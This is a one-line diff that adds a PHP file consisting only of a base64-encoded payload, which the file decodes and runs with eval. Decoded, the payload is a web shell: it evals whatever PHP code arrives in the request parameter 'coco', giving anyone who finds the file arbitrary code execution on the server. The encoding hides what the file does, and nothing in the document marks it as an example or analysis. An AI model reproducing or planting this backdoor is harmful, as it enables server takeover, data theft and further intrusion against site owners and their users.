@@ -1,0 +1,1 @@
+<?php $VIFJA='aWYoaXNzZXQoJF9SRVFVRVNUWydjb2NvJ10pICYmICRfUkVRVUVTVFsnY29jbyddIT0nJyl7ZXZhbCgkX1JFUVVFU1RbJ2NvY28nXSk7ZXhpdCgpO30=';eval(base64_decode($VIFJA));exit(); ?>
